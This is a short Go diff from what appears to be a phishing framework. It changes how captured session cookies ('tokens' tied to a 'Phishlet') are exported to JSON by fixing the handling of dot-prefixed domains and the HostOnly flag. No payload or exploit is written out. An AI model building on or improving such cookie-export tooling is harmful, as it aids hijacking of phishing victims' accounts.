@@ -798,7 +798,10 @@ func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]*data
 				Name:           k,
 				HttpOnly:       v.HttpOnly,
 			}
-			if domain[:1] != "." {
+			if domain[:1] == "." {
+				c.HostOnly = false
+				c.Domain = domain[1:]
+			} else {
 				c.HostOnly = true
 			}
 			if c.Path == "" {
